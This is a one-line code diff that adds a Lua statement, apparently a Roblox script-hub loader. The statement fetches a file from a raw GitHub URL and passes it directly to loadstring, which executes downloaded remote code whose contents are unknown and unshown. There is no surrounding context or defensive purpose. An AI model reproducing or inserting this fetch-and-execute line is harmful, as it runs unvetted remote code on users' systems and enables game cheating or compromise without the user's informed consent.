@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Darkmoonxhubscript/DarkmoonX2/main/File"))()
